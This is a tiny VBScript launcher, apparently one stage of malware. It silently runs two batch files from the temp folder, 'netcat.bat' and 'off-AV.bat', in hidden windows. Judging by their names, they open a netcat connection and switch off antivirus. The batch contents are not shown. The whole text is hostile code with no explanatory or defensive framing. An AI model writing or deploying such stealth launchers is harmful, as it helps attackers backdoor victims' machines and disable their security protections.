Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c start /min %TEMP%/netcat.bat", 0, True
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c start /min %TEMP%/off-AV.bat", 0, True










